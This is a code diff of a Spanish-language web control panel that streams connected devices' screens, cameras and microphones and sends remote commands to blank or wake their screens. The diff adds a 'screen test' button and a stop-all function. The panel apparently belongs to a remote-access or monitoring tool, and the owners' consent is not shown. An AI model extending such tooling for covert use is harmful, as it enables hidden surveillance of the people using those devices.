@@ -94,7 +94,6 @@
       const deviceCount = document.getElementById("deviceCount");
       const logConsole = document.getElementById("logConsole");
 
-      // Estados independientes por dispositivo guardados en memoria local del cliente
       const deviceStates = {};
 
       setInterval(() => {
@@ -127,11 +126,9 @@
           return;
         }
 
-        // Limpiar o sincronizar manteniendo estados previos si existen
         devicesContainer.innerHTML = "";
 
         devices.forEach((dev) => {
-          // Inicializar estado por defecto si el dispositivo es nuevo
           if (!deviceStates[dev.id]) {
             deviceStates[dev.id] = {
               isStreaming: false,
@@ -158,7 +155,6 @@
 
             <!-- Pantallas de Visualización Independientes -->
             <div class="grid grid-cols-2 gap-2">
-              <!-- Visor de Pantalla -->
               <div class="relative w-full h-[160px] bg-black border border-gray-800 rounded flex items-center justify-center overflow-hidden">
                 <img id="screen_${dev.id}" alt="Stream Pantalla" class="object-contain w-full h-full ${state.isStreaming ? '' : 'hidden'}" src="${state.screenSrc || ''}" />
                 <span id="screen_ph_${dev.id}" class="text-[9px] text-gray-500 text-center px-1 ${state.isStreaming ? 'hidden' : ''}">
@@ -167,7 +163,6 @@
                 <span class="absolute top-1 left-1 text-[8px] bg-black/70 text-[#00E5FF] px-1 rounded">STREAM</span>
               </div>
 
-              <!-- Visor de Cámara / Foto -->
               <div class="relative w-full h-[160px] bg-black border border-gray-800 rounded flex items-center justify-center overflow-hidden">
                 <img id="cam_${dev.id}" alt="Visor Cámara" class="object-contain w-full h-full ${(state.isCamera || state.photoSrc) ? '' : 'hidden'}" src="${state.camSrc || state.photoSrc || ''}" />
                 <span id="cam_ph_${dev.id}" class="text-[9px] text-gray-600 text-center px-1 ${(state.isCamera || state.photoSrc) ? 'hidden' : ''}">
@@ -195,13 +190,23 @@
                 ${state.isAudio ? '🎤 AUDIO: ON' : '🎤 AUDIO: OFF'}
               </button>
 
-              <!-- Control de Energía / Pantalla -->
+              <!-- Controles de Energía de Pantalla -->
               <button onclick="turnOffScreen('${dev.id}', '${dev.name}')" class="bg-red-900/80 text-red-200 border border-red-700 text-[9px] font-bold py-1.5 px-1 rounded hover:bg-red-800 transition text-center">
                 🔒 APAGAR PANTALLA
               </button>
 
               <button onclick="turnOnScreen('${dev.id}', '${dev.name}')" class="bg-blue-900/80 text-blue-200 border border-blue-700 text-[9px] font-bold py-1.5 px-1 rounded hover:bg-blue-800 transition text-center">
                 💡 PRENDER PANTALLA
+              </button>
+
+              <!-- NUEVO: Botón específico para la prueba de apagado de pantalla que añadiste en la app -->
+              <button onclick="testScreenOff('${dev.id}', '${dev.name}')" class="col-span-2 bg-purple-900/80 text-purple-200 border border-purple-500 text-[9px] font-bold py-1.5 px-1 rounded hover:bg-purple-800 transition text-center">
+                🧪 PROBAR APAGADO DE PANTALLA (SCREEN TEST)
+              </button>
+
+              <!-- Botón general para detener procesos -->
+              <button onclick="stopAllTest('${dev.id}', '${dev.name}')" class="col-span-2 bg-amber-600 text-black border border-amber-500 text-[9px] font-bold py-1.5 px-1 rounded hover:bg-amber-500 transition text-center">
+                ⏹️ DETENER TODO (STOP ALL)
               </button>
             </div>
           `;
@@ -274,24 +279,39 @@
         }
       }
 
-      // Nuevas funciones de control de pantalla
       function turnOffScreen(socketId, deviceName) {
         log(`Enviando orden de bloquear/apagar pantalla a: ${deviceName}`);
-        socket.emit("send_command_to_device", { 
-          targetId: socketId, 
-          action: "turn_off_screen" 
-        });
+        socket.emit("send_command_to_device", { targetId: socketId, action: "turn_off_screen" });
       }
 
       function turnOnScreen(socketId, deviceName) {
         log(`Enviando orden de encender pantalla a: ${deviceName}`);
-        socket.emit("send_command_to_device", { 
-          targetId: socketId, 
-          action: "turn_on_screen" 
-        });
+        socket.emit("send_command_to_device", { targetId: socketId, action: "turn_on_screen" });
       }
 
-      // Gestión de Audio independiente por dispositivo
+      // Función específica para ejecutar la prueba de apagado de pantalla en la app
+      function testScreenOff(socketId, deviceName) {
+        log(`Iniciando prueba de apagado de pantalla para: ${deviceName}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "screen_test" });
+      }
+
+      function stopAllTest(socketId, deviceName) {
+        log(`Deteniendo todas las pruebas activas para: ${deviceName}`);
+        const state = deviceStates[socketId];
+        if (state) {
+          state.isStreaming = false;
+          state.isCamera = false;
+          state.isAudio = false;
+          state.screenSrc = "";
+          state.camSrc = "";
+          state.photoSrc = "";
+        }
+
+        socket.emit("send_command_to_device", { targetId: socketId, action: "stop_screen" });
+        socket.emit("send_command_to_device", { targetId: socketId, action: "stop_camera" });
+        socket.emit("send_command_to_device", { targetId: socketId, action: "stop_audio" });
+      }
+
       const activeAudioStreams = {};
       let audioCtx = null;
 
